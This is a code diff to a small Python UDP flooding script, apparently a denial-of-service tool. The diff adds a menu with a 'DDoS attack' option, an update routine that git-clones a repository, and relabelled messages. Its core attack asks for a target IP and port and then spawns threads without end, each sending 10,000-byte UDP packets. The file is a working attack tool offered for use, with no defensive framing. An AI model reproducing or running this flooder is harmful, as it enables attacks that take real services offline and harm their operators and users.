@@ -10,11 +10,12 @@
 
 import socket
 import threading
+import subprocess
 
 try:
     from colorama import Fore, Style
 except Exception as e:
-    exit(f"{RED}[!] {e}{RESET}")
+    exit(f"[ERROR] {e}")
 
 GREEN = Fore.GREEN
 RED = Fore.RED
@@ -48,32 +49,62 @@ BANNER = YELLOW + f"""
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠻⠧⠶⠾⠛⠁
 """ + RESET
 
+def update():
+    try:
+        result = subprocess.run(
+            ["git", "clone", "https://github.com/oskaroponski/Duck.git"],
+            check=True,
+            text=True,
+            capture_output=True
+        )
+        print(result.stdout)
+    except subprocess.CalledProcessError as e:
+        print(f"{RED}[ERROR] {e.stderr}")
+    except Exception as e:
+        print(f"{RED}[ERROR] {str(e)}")
+
 def send_packets(ip, port):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.sendto(b"A" * 10000, (ip, port))
 
     except Exception as e:
-        exit(f"{RED}[!] {e}{RESET}")
+        exit(f"{RED}[ERROR] {e}{RESET}")
 
 print(BANNER)
 
+print("-1. Update")
+print("0.  Exit")
+print("1.  DDoS attack")
+
 try:
-    ip = input(BLUE + "[>] Target IP: " + RESET)
+    choice = int(input(f"{BLUE}[INPUT] Choice: {RESET}"))
 except Exception as e:
-    exit(f"{RED}[!] {e}{RESET}")
+    exit(f"{RED}[ERROR] {e}{RESET}")
 
-try:
-    port = int(input(BLUE + "[>] Target Port: " + RESET))
-except Exception as e:
-    exit(f"{RED}[!] {e}{RESET}")
+if choice == -1:
+    update()
 
-print(GREEN + "[+] Starting attack... Press Ctrl+C to stop." + RESET)
+if choice == 0:
+    exit()
 
-try:
-    while True:
-        thread = threading.Thread(target=send_packets, args=(ip, port))
-        thread.start()
+if choice == 1:
+    try:
+        ip = input(BLUE + "[INPUT] Target IP: " + RESET)
+    except Exception as e:
+        exit(f"{RED}[ERROR] {e}{RESET}")
 
-except KeyboardInterrupt:
-    print(RED + "\n[-] Attack stopped." + RESET)
+    try:
+        port = int(input(BLUE + "[INPUT] Target Port: " + RESET))
+    except Exception as e:
+        exit(f"{RED}[ERROR] {e}{RESET}")
+
+    print(GREEN + "[SUCCESS] Starting attack... Press Ctrl+C to stop." + RESET)
+
+    try:
+        while True:
+            thread = threading.Thread(target=send_packets, args=(ip, port))
+            thread.start()
+
+    except KeyboardInterrupt:
+        print(RED + "\n[FAILED] Attack stopped." + RESET)
